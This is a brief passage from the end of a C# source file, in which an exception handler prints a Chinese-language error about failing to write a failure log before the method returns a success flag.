                            Console.WriteLine($"\n[错误] 无法写入失败日志: {ex.Message}");
                        }
                    }
                }
            }

            return success;
        }
    }
}